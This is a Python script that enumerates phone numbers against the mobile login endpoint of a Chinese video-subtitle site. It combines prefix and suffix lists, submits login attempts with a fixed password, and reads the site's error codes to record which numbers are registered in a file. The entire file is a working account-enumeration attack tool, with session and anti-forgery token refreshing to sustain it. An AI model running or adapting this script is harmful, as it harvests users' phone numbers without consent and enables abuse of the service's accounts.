#!/usr/bin/python3
# coding:utf-8


import requests
from lxml import etree
import json
import time


class CvntCry:
  def __init__(self):
    self.url = "http://www.rrys2019.com/user/login"
    self.headers = {
      "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36 OPR/55.0.2994.61",
      "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3"
    }
    self.post_url = "http://www.rrys2019.com/user/login/mobile_login"
    self.post_headers = {
      "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36 OPR/55.0.2994.61",
      "Accept":"application/json, text/javascript, */*; q=0.01",
      "Content-Type":"application/x-www-form-urlencoded",
      "Host":"www.zmz2019.com",
      "Origin":"http://www.rrys2019.com",
      "Referer":"http://www.rrys2019.com/user/login"
    }
    self.telHeadList = []
    self.telTailSet = set()

  def enumerateTel(self):
    print("**start program**")
    time.sleep(2)
    print("read tel head...")
    with open("telhead.txt","r",encoding="utf-8") as f:
      l = 1
      while l:
        l = f.readline()
        head = l.split("\n")[0]
        if head != "":
          self.telHeadList.append(head)
    time.sleep(2)
    print("read tel tail...")
    with open("teltail.txt","r",encoding="utf-8") as f:
      l = 1
      while l:
        l = f.readline()
        tail = l.split("\n")[0]
        if tail != "":
          self.telTailSet.add(tail)

  def getNewSession(self):
    print("get new session...")
    while True:
      session = requests.session()
      try:
        response = session.get(self.url,headers=self.headers)
      except Exception as e:
        print("get session err, try again...")
        time.sleep(2)
        continue
      if response.status_code == 200:
        break
      else:
        print("502...")
        time.sleep(2)
        continue
    newCookies = session.cookies.get_dict()
    html = response.content.decode()
    html = etree.HTML(html)
    newHash = html.xpath("//input[@name='__hash__']/@value")[0]
    return newHash,newCookies

  def tryRegTel(self):
    for telhead in self.telHeadList:
      time.sleep(2)
      print("try next tel head...")
      newHash,newCookies = self.getNewSession()
      for teltail in self.telTailSet:
        tel = telhead + teltail
        post_data = {"area":"86","mobile":tel,"password":"CVNTCRYING","__hash__":newHash}
        while True:
          try:
            response = requests.post(self.post_url,headers=self.post_headers,data=post_data,cookies=newCookies)
          except Exception as e:
            print("post request err, try again...")
            time.sleep(2)
            continue
          if response.status_code == 200:
            break
          else:
            print("502...")
            time.sleep(2)
            continue
        html = response.content.decode()
        html = json.loads(html)
        info = html["info"]
        status = html["status"]
        if info == "手机号未注册，请先注册":
          continue
        else:
          if status == 4006 or status == 4005:
            print("matched one tel...")
            with open("matchedtels.txt","a",encoding="utf-8") as f:
              f.write(tel + "\n")
            newHash,newCookies = self.getNewSession()
      with open("history.txt","a",encoding="utf-8") as f:
        f.write(telhead + "\n")
      print("tried 10000 tels...")
    print("**end program**")

  def run(self):
    self.enumerateTel()
    self.tryRegTel()


if __name__ == "__main__":
  cry = CvntCry()
  cry.run()

  
